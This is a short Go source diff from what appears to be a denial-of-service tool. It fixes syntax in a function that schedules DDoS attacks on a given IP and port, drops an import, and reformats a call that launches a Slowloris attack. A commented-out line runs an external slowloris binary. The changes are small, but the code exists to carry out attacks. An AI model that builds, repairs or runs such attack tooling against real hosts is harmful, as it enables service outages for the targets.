@@ -7,7 +7,6 @@ import (
 	"math/rand"
 	"net/http"
 	"os/exec"
-	"strings"
 
 	//"strings"
 	"net"
@@ -68,7 +67,7 @@ func checkDDoS() {
 	}
 }
 
-func cronAttackDDoS(ip string, port string date string, dateNs int64) {
+func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 	scheduler := gocron.NewScheduler()
 
 	// Begin job at a specific date/time
@@ -93,7 +92,7 @@ func attackDDoS(ip string, port string) {
 	switch x {
 	case 1:
 		fmt.Println("------------------------Starting Slowloris Attack------------------------")
-		slowloris(ip+":"+port)
+		slowloris(ip + ":" + port)
 		/*out, err := exec.Command("./slowloris", ip).Output()
 		if err != nil {
 			log.Fatal(err)
